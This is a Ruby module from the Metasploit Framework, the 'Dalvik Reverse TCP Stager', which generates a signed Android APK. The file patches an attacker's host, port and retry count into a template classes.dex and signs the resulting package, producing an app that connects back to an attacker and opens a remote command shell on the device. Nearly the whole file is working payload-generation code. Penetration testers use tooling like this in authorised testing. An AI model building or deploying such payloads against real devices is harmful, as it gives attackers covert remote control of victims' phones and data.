##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Stager
  include Msf::Payload::Dalvik

  def initialize(info = {})
    super(merge_info(info,
      'Name'			=> 'Dalvik Reverse TCP Stager',
      'Description'	=> 'Connect back stager',
      'Author'		=> 'timwr',
      'License'		=> MSF_LICENSE,
      'Platform'		=> 'android',
      'Arch'			=> ARCH_DALVIK,
      'Handler'		=> Msf::Handler::ReverseTcp,
      'Stager'		=> {'Payload' => ""}
    ))

    register_options(
    [
      OptInt.new('RetryCount', [true, "Number of trials to be made if connection failed", 10])
    ], self.class)
  end

  def generate_jar(opts={})
    jar = Rex::Zip::Jar.new

    classes = File.read(File.join(Msf::Config::InstallRoot, 'data', 'android', 'apk', 'classes.dex'), {:mode => 'rb'})

    string_sub(classes, 'XXXX127.0.0.1                       ', "XXXX" + datastore['LHOST'].to_s) if datastore['LHOST']
    string_sub(classes, 'YYYY4444                            ', "YYYY" + datastore['LPORT'].to_s) if datastore['LPORT']
    string_sub(classes, 'TTTT                                ', "TTTT" + datastore['RetryCount'].to_s) if datastore['RetryCount']
    jar.add_file("classes.dex", fix_dex_header(classes))

    files = [
      [ "AndroidManifest.xml" ],
      [ "resources.arsc" ]
    ]

    jar.add_files(files, File.join(Msf::Config.data_directory, "android", "apk"))
    jar.build_manifest

    cert, key = generate_cert
    jar.sign(key, cert, [cert])

    jar
  end

end
